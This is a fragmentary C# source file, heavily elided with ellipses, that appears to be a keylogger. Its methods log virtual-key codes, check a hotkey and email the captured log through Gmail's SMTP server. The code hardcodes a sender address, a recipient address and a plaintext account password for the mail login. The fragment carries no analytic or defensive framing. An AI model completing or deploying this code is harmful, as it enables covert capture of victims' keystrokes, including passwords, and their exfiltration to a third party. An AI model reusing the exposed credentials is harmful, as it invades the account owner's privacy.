...
namespace Class1
{
    class Program
    {
        ...
        public static void WriteLog(int vkCode)
        {
        ...
        public static void CheckHotKey(int vkCode)
        {
        ...
        public static void SendMail()
        {
            try
            {
                ...
                mail.From = new MailAddress("canhchimhaiau.7792@gmail.com");
                mail.To.Add("minhphucpk.1997@gmail.com");
                ...
                SmtpServer.Port = 587;
                SmtpServer.Credentials = new System.Net.NetworkCredential("canhchimhaiau.7792@gmail.com", "Naruto1997");
